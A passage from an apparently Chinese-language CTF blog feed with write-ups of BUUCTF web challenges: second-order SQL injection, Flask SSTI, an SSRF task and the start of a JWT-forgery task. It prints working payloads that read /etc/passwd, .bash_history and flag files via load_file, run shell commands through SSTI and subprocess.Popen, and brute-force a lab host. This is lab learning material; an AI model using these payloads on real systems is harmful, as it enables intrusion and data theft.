$_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢åä¿®æ¹æå&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//confirm.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = $_POST[<span class="string">&quot;address&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">&quot;å·²æäº¤è®¢å&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢åæäº¤æå&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//delete.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $result = $db-&gt;query(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . $row[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢åå é¤æå&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>审计一下可以发现，本题中没有对address进行过滤，所以需要我们构造语句<br>真好 phpstorm崩溃了<br>想到之前sqlilabs刷的二次注入，一开始的change.php中只对address进行了 addslashes处理然后就进行了update处理<br>所以我的思路是这样的，先存一个address，然后用change插入注入语句，因为插入到表中以后转义的字符时不存在的，取出来也就不存在了，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210524002354.png" alt="img" style="zoom:67%;"><br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; where &#96;user_id&#96;&#x3D;extractvalue(1,concat(&#39;~&#39;,(select load_file(&#39;&#x2F;flag.txt&#39;))))#</span><br></pre></td></tr></table></figure>

<p>至于为啥想读文件，因为表里没有–<br>最后这里看了一下wp，毕竟文件名要猜==</p>
<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>又是一题二次注入<br>首先是登录<br>账号是zhangwei 密码是zhagnwei666 后面数字直接爆破就行了<br>进去以后啥都没有，猜测是存在文件泄露——发现git泄露，扫描一波：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>思路很明确了。我们需要利用category这个参数来传入值<br>首先我们利用write传值，然后利用comment改值<br>传入:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2&#39;,content&#x3D;(select database()),&#x2F;*</span><br></pre></td></tr></table></figure>

<p>这里解释一下 我们需要用/**/这个注释符，因为从源码中我们可以看出，他是多行的，所以我们需要选择多行注释符<br>接下来点击详情 输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;#</span><br></pre></td></tr></table></figure>

<p>进行闭合 并注释后面的内容<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210524233459.png" alt="img" style="zoom:67%;"></p>
<p>可以看到如下</p>
<p>接下来就是常规注入，但是没有发现flag，这里新学了一种思路<br>我们查看user()发现是root权限<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210524233602.png" alt="img" style="zoom:67%;"></p>
<p>既然是root权限，那么大概率其实应该是读取文件~<br>接下来就是寻找的一个过程了，这里学了一下学长的思路~很牛！<br>我们查看etc/passwd</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210524234224.png" alt="img"><br>发现www用户的存在，于是这个时候 我们可以选择继续查看</p>
<p><strong>有时历史记录命令未存储在.bash_history中</strong></p>
<p>bash_history的记录 看看是否有线索：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210524234443.png" alt="img" style="zoom:67%;"><br>得到较完整路径，并且看到 <strong>.DS_Store</strong> 的存在<br> <strong>.DS_Store</strong> 是系统自动生成的一个隐藏的文件，存贮目录的自定义属性<br>所以我们可以看看其中的信息</p>
<p>目标环境是docker，所以 <strong>.DS_Store</strong> 文件应该在 <strong>/tmp</strong> 中。而 <strong>.DS_Store</strong> 文件中，经常会有一些不可键字符，所以我们可以使用hex函数对其内容进行转换，payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210525000523.png" alt="img" style="zoom:67%;">
找到flag，最终payload

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,content&#x3D;(select (load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>buuctf17</title>
    <url>/2021/06/05/buuctf17/</url>
    <content><![CDATA[<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>又是二次注入，注册登录改密</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html; charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;p&gt;oldpass: &lt;input type=&quot;text&quot; name=&quot;oldpass&quot; /&gt;&lt;/p&gt;&lt;p&gt;newpass: &lt;input type=&quot;text&quot; name=&quot;newpass&quot; /&gt;&lt;/p&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;oldpass&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;newpass&#x27;</span>]))&#123;</span><br><span class="line">	$oldpass = md5($_POST[<span class="string">&#x27;oldpass&#x27;</span>]);</span><br><span class="line">	$newpass = md5($_POST[<span class="string">&#x27;newpass&#x27;</span>]);</span><br><span class="line">	$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	$sql = <span class="string">&quot;update users set pwd=&#x27;<span class="subst">$newpass</span>&#x27; where name=\&quot;<span class="subst">$username</span>\&quot; and pwd=&#x27;<span class="subst">$oldpass</span>&#x27;&quot;</span>;</span><br><span class="line">	<span class="comment">// var_dump($sql);</span></span><br><span class="line">	$query = mysql_query($sql);</span><br><span class="line">	<span class="keyword">if</span>($query)&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(mysql_error());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接看这段代码吧，username此时是没有被md5加密的，也就是说这是我们的利用点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$string</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//$string = preg_replace(&quot;#(\s)|(/\*.*\*/)#i&quot;, &quot;&quot;, $string);</span></span><br><span class="line">	$postfilter = <span class="string">&quot;#(\s)|(/\*.*\*/)|file|insert|&lt;|and|floor|ord|char|ascii|mid|left|right|hex|sleep|benchmark|substr|@|`|delete|like#i&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span>(preg_match($postfilter, $string,$matches))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;invalid string!&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是过滤内容，所以我们可以闭合username</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adm&quot;extractvalue(1,concat(database()))#</span><br></pre></td></tr></table></figure>

<p>z这边看到一个师傅的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test&quot;^updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)&amp;&amp;(column_name)regexp(&#39;^r&#39;))),1)#</span><br></pre></td></tr></table></figure>

<p>有意思的是 flag所在的列名没有完全出来，于是就使用了正则匹配匹配字符r得到flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210525003729.png" alt="img" style="zoom:67%;"></p>
<p>最后要记得翻转哈，不然长度限制了</p>
<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>查看源码有提示，SSTI注入<br>直接上payload</p>
<p>怎么说 我忘记保存了– </p>
<p>一开始没发现过滤东西，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210528002149.png" alt="img" style="zoom:67%;"><br>找到了读文件的file方法，但是不知道flag位置<br>于是尝试其他方法，发现会跳转500，感觉是什么被过滤了，发现是globals</p>
<p>尝试一下绕过：发现拼接法可以绕过:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&quot;ls&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就可以随便使用命令<br>这里没用builitins当跳板，因为eval被禁用了，直接用上面这个更简洁</p>
<p>然后这里说一下wp的方法，感觉挺新奇的:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">inux下有一个文件&#x2F;proc&#x2F;self&#x2F;environ，这个文件里保存了系统的一些变量。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210528004229.png" alt="img" style="zoom:67%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](&#39;&#x2F;flasklight&#x2F;app.py&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>读取源码<br>发现提示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CCC&#123;the_flag_is_this_dir&#125;</span><br></pre></td></tr></table></figure>

<p>但是不知道flag的文件名<br>WP说可以利用subprocess.Popen这个类，无需globals也可以进行读取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://202f932e-6c5b-47c0-9de9-0a1627399bb6.node3.buuoj.cn/?search=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    payload = <span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[%s]&#125;&#125;&quot;</span>%i</span><br><span class="line">    print(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;subprocess.Popen&#x27;</span> <span class="keyword">in</span> s.get(url+payload).text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>结果是258<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>不过也挺麻烦的==</p>
<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        $http_x_headers = explode(<span class="string">&#x27;,&#x27;</span>, $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $http_x_headers[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    $sandbox = <span class="string">&quot;sandbox/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(<span class="string">&quot;GET &quot;</span> . escapeshellarg($_GET[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, basename($info[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[<span class="string">&quot;basename&quot;</span>]), $data);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>之前做过了 在i春秋10 就是利用get里面的perl命令执行，然后这题好像没有flag–</p>
<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>注册——登录 F12查看源码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> *  或许该用 koa-static 来处理静态文件</span><br><span class="line"> *  路径该怎么配置？不管了先填个根目录XD</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>

<p>知道是koa-static</p>
<p>不知道是个啥 是node.js吧？于是乎去学习一下看了一下wp说是要在controllers下的api.js才是真正的源码</p>
<h3 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h3><p>由于本题是基于koa框架的，所以需要了解他的一些基础信息</p>
<p>koa框架常用目录、文件</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210607214627.png" alt="img" style="zoom: 50%;">

<p>看了这个框架后很明显，我们需要找的是处理逻辑，但是本题中，处理逻辑放在<br>controllers/api.js文件下（经验），有的controllers默认目录下的文件就是api.js</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;)</span><br><span class="line"></span><br><span class="line">const APIError = require(&#x27;../rest&#x27;).APIError;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);</span><br><span class="line">        const secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);//jwt验证</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || !password) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        console.log(sid)</span><br><span class="line"></span><br><span class="line">        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">        const status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        if(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        if(ctx.session.username !== &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const flag = fs.readFileSync(&#x27;/flag&#x27;).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = null;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: true</span><br><span class="line">        &#125;)</span><br><span class="line">        await next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>看了一下代码，主要是是要伪造jwt为admin然后就可以读取flag惹=-=<br>印象中之前也做过一题伪造jwt了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210607215554.png" alt="img"></p>
